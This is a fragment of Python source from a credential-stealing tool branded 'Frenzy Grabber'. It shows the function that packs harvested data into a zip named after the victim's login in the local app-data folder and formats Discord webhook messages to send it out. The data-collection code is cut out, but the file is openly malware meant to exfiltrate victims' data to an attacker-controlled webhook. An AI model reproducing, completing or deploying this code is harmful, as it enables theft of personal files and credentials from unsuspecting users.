...
def main(webhook: str):
    ...
    data = {
        "username": "Frenzy",
        "avatar_url": "https://media.discordapp.net/attachments/1149836379845574766/1152521950493671485/2Q.png"
    }

    _file = f'{localappdata}\\Frenzy-Logged-{os.getlogin()}.zip'
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "Frenzy Grabber | Created By frenzyzwaake"
                    },
                    "thumbnail": {
                        "url": "https://media.discordapp.net/attachments/1149836379845574766/1152521950493671485/2Q.png"
                    }
                }
            ],
            "username": "Frenzy",
